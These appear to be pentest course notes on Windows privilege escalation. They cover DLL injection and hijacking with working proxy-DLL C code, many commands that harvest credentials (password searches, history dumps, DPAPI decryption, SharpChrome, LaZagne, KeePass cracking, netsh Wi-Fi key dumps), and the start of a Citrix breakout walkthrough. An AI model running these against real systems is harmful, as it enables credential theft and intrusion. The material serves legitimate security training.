## Reflective DLL Injection

> `Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.
>
> [Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demonstrating the technique. Borrowing his explanation below:
>
> "The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.
>
> Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.
>
> 1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
> 2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
> 3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
> 4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
> 5. The library's headers and sections are loaded into their new memory locations.
> 6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
> 7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
> 8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
> 9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate."

## DLL Hijacking

> `DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.
>
> The default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.
>
> 1. Press `Windows key + R` to open the Run dialog box.
> 2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.
> 3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
> 4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
> 5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
> 6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.
>
> With this mode enabled, applications search for necessary DLL files in the following sequence:
>
> 1. The directory from which the application is loaded.
> 2. The system directory.
> 3. The 16-bit system directory.
> 4. The Windows directory.
> 5. The current directory.
> 6. The directories that are listed in the PATH environment variable.
>
> However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:
>
> 1. The directory from which the application is loaded.
> 2. The current directory.
> 3. The system directory.
> 4. The 16-bit system directory.
> 5. The Windows directory
> 6. The directories that are listed in the PATH environment variable
>
> DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:
>
> 1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
> 2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

> After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.

Let’s take a practical example. Consider the C program below:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

> It loads an `add` function from the `library.dll` and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the `library.dll` located in the same directory.
>
> First, let's set up a filter in procmon to solely include `main.exe`, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of `main.exe`. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close `main.exe` and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FV2KR4eoRF8Kh7dzJH5fu%2Fimage.png?alt=media&amp;token=745b553f-0b46-4d49-90d4-d670f9eb745b" alt=""><figcaption></figcaption></figure>

> Then if you scroll to the bottom, you can see the call to load `library.dll`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Ffs3pDSBhSWTJ1nZHt626%2Fimage.png?alt=media&amp;token=acafcead-43a9-4e34-aac3-42a52fab273e" alt=""><figcaption></figcaption></figure>

> We can further filter for an `Operation` of `Load Image` to only get the libraries the app is loading.

```shell-session
16:13:30,0074709	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\main.exe	SUCCESS	Image Base: 0xf60000, Image Size: 0x26000
16:13:30,0075369	main.exe	47792	Load Image	C:\Windows\System32\ntdll.dll	SUCCESS	Image Base: 0x7ffacdbf0000, Image Size: 0x214000
16:13:30,0075986	main.exe	47792	Load Image	C:\Windows\SysWOW64\ntdll.dll	SUCCESS	Image Base: 0x77a30000, Image Size: 0x1af000
16:13:30,0120867	main.exe	47792	Load Image	C:\Windows\System32\wow64.dll	SUCCESS	Image Base: 0x7ffacd5a0000, Image Size: 0x57000
16:13:30,0122132	main.exe	47792	Load Image	C:\Windows\System32\wow64base.dll	SUCCESS	Image Base: 0x7ffacd370000, Image Size: 0x9000
16:13:30,0123231	main.exe	47792	Load Image	C:\Windows\System32\wow64win.dll	SUCCESS	Image Base: 0x7ffacc750000, Image Size: 0x8b000
16:13:30,0124204	main.exe	47792	Load Image	C:\Windows\System32\wow64con.dll	SUCCESS	Image Base: 0x7ffacc850000, Image Size: 0x16000
16:13:30,0133468	main.exe	47792	Load Image	C:\Windows\System32\wow64cpu.dll	SUCCESS	Image Base: 0x77a20000, Image Size: 0xa000
16:13:30,0144586	main.exe	47792	Load Image	C:\Windows\SysWOW64\kernel32.dll	SUCCESS	Image Base: 0x76460000, Image Size: 0xf0000
16:13:30,0146299	main.exe	47792	Load Image	C:\Windows\SysWOW64\KernelBase.dll	SUCCESS	Image Base: 0x75dd0000, Image Size: 0x272000
16:13:31,7974779	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\library.dll	SUCCESS	Image Base: 0x6a1a0000, Image Size: 0x1d000
```

## Proxying

> We can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function `Add` from `library.dll`, tamper with it, and then return it to `main.exe`.
>
> 1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.
> 2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.
> 3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.
> 4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.
>
> The code is as follows:

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

> Either compile it or use the precompiled version provided. Rename `library.dll` to `library.o.dll`, and rename `tamper.dll` to `library.dll`.
>
> Running `main.exe` then shows the successful hack.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfslbxeGgJUVsjeZjEhn6%2Fimage.png?alt=media&amp;token=9a9e54e4-5947-4551-9086-5911bb4c774a" alt=""><figcaption></figcaption></figure>

### Invalid Libraries

> Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in `.dll` and has a status of `NAME NOT FOUND` we can find such libraries in `main.exe`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FLnHsW238TmCg22LMwe7e%2Fimage.png?alt=media&amp;token=7f09638a-b140-4745-9f84-a1b78c5accab" alt=""><figcaption></figcaption></figure>

> As we know, `main.exe` searches in many locations looking for `x.dll`, but it doesn’t find it anywhere. The entry we are particularly interested in is:

```shell-session
17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

> Where it is looking to load `x.dll` from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in `x.dll`.

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

> This code defines a DLL entry point function called `DllMain` that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print `Hijacked... Oops...` to the terminal, but you could theoretically do anything here.
>
> Either compile it or use the precompiled version provided. Rename `hijack.dll` to `x.dll`, and run `main.exe`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlKSgIktkhmXpufwF6d4J%2Fimage.png?alt=media&amp;token=f1cadd58-0e2b-44d1-a3a6-7f55307ba2e7" alt=""><figcaption></figcaption></figure>

# Credential Theft

## 1.Credential Theft

## Application Configuration Files

### **Searching for Files**

```powershell-session
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

> Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.

## Dictionary Files

### **Chrome Dictionary Files**

```powershell-session
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## Unattended Installation Files

### Unattend.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

> Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

## PowerShell History File

> Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:
>
> * `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

### **Confirming PowerShell History Save Path**

> As seen in the (handy) Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).

```powershell-session
PS C:\htb> (Get-PSReadLineOption).HistorySavePath
```

### **Reading PowerShell History File**

```powershell-session
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
```

> We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.

```powershell-session
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## PowerShell Credentials

> PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.
>
> Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

### **Decrypting PowerShell Credentials**

> If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

```powershell-session
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

PS C:\htb> $credential.GetNetworkCredential().password
```

## 2.Other Files

> There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file. I have performed many penetration tests where a password found on a share drive or local drive led to either initial access or privilege escalation. Many companies provide each employee with a folder on a file share mapped to their user id, i.e., the folder `bjones` on the `users` share on a server called `FILE01` with loose permissions applied (i.e., all Domain Users with read access to all user folders). We often find users saving sensitive personal data in these folders, unaware they are accessible to everyone in the network and not just local to their workstation.

## Manually Searching the File System for Credentials

> We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).

### Search File Contents for String

```cmd-session
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

### Search File Contents for String

```cmd-session
C:\htb> findstr /si password *.xml *.ini *.txt *.config
```

### **Search File Contents for String**

```cmd-session
C:\htb> findstr /spin "password" *.*
```

### Search File Contents with PowerShell

```powershell-session
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

### **Search for File Extensions**

```cmd-session
C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

### **Search for File Extensions**

```cmd-session
C:\htb> where /R C:\ *.config
```

### **Search for File Extensions Using PowerShell**

```powershell-session
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

## Sticky Notes Passwords

> People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### **Looking for StickyNotes DB Files**

```powershell-session
PS C:\htb> ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

> We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FYMB6Cm1LrIEj1wiYPSpc%2Fimage.png?alt=media&amp;token=ffa23eaa-0bf7-4f78-b6c1-97aa36692f75" alt=""><figcaption></figcaption></figure>

### Viewing Sticky Notes Data Using PowerShell

> This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.

```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

### Strings to View DB File Contents

```shell-session
strings plum.sqlite-wal
```

## Other Files of Interest

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

> Some of the privilege escalation enumeration scripts listed earlier in this module search for most, if not all, of the files/extensions mentioned in this section. Nevertheless, we must understand how to search for these manually and not only rely on tools. Furthermore, we may find interesting files that enumeration scripts do not look for and wish to modify the scripts to include them.

***

## 3.Further Credential Theft

## Cmdkey Saved Credentials

### **Listing Saved Credentials**

```cmd-session
C:\htb> cmdkey /list
```

> When we attempt to RDP to the host, the saved credentials will be used.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqGOeVUdmCzPtSQzvXqmK%2Fimage.png?alt=media&amp;token=f23f6bd2-6181-4668-a71f-faaeb6bd1e5b" alt=""><figcaption></figcaption></figure>

> We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

### Run Commands as Another User

```powershell-session
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials

### Retrieving Saved Credentials from Chrome

> Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
PS C:\htb> .\SharpChrome.exe logins /unprotect
```

> Note: Credential collection from Chromium-based browsers typically generates additional events that could be logged and identified by the blue team such as `4688` (process creation) and `16385` (DPAPI activity); defenders may also consider filesystem/object access events such as `4662` (object access) and `4663` (file access) to improve detection fidelity.

## Password Managers

> Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`. Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

### Extracting KeePass Hash

```shell-session
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

### Cracking Hash Offline

```shell-session
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## Email

> If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

## More Fun with Credentials

> When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.

### **Viewing LaZagne Help Menu**

```powershell-session
PS C:\htb> .\lazagne.exe -h
```

### **Running All LaZagne Modules**

```powershell-session
PS C:\htb> .\lazagne.exe all
```

## Even More Fun with Credentials

> We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.

### **Running SessionGopher as Current User**

```powershell-session
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

## Clear-Text Password Storage in the Registry

> Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. While tools such as `Lazagne` and `SessionGopher` are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.

### Windows AutoLogon

> Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.
>
> The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

> The typical configuration of an Autologon account involves the manual setting of the following registry keys:
>
> * `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
> * `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
> * `DefaultPassword` - Holds the value of the password for the user account specified previously.

### **Enumerating Autologon with reg.exe**

```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

> `Note:` If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

## Putty

> For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

> Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

### **Enumerating Sessions and Finding Credentials:**

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

> Next, we look at the keys and values of the discovered session "`kali%20ssh`":

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

> In this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.
>
> For additional information on `reg.exe` and working with the registry, be sure to check out the [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623) module.

## Wifi Passwords

### **Viewing Saved Wireless Networks**

```cmd-session
C:\htb> netsh wlan show profile
```

### **Retrieving Saved Wireless Passwords**

```cmd-session
C:\htb> netsh wlan show profile ilfreight_corp key=clear
```


# Attacking Restricted Environments

## 1.Citrix Breakout

> Basic Methodology for break-out:
>
> 1. Gain access to a `Dialog Box`.
> 2. Exploit the Dialog Box to achieve `command execution`.
> 3. `Escalate privileges` to gain higher levels of access.

> In certain environments, where minimal hardening measures are implemented, there might even be a standard shortcut to `cmd.exe` in the Start Menu, potentially aiding in unauthorized access. However, in a highly restrictive `lock-down` environment, any attempts to locate "cmd.exe" or "powershell.exe" in the start menu will yield no results. Similarly, accessing `C:\Windows\system32` through File Explorer will trigger an error, preventing direct access to critical system utilities. Acquiring access to the "CMD/Command Prompt" in such a restricted environment represents a notable achievement, as it provides extensive control over the Operating System. This level of control empowers an attacker to gather valuable information, facilitating the further escalation of privileges.
>
> There are many techniques which can be used for breaking out of a Citrix environment. This section will not cover every possible scenario, but we will walk through the most common ways to perform a Citrix breakout.
>
> Visit `http://humongousretail.com/remote/` using the RDP session of the spawned target and login with the provided credentials below. After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file in order to connect to the restricted environment.

```citrixcredentials
Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
```

## Bypassing Path Restrictions

> When we attempt to visit `C:\Users` using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the `C:\` drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FTC0qZfPFIqICQRQ5E6LK%2Fimage.png?alt=media&amp;token=5f0059cc-67f9-406b-bc1e-90cf34cf4e91" alt=""><figcaption></figcaption></figure>

> Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using `MS Paint` as an example for this section.
>
> Run `Paint` from start menu and click on `File > Open` to open the Dialog Box.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FwIz5Z5sS0214WVrrtqkK%2Fimage.png?alt=media&amp;token=32ecae63-208c-42dd-8285-3c9a323cbb92" alt=""><figcaption></figcaption></figure>

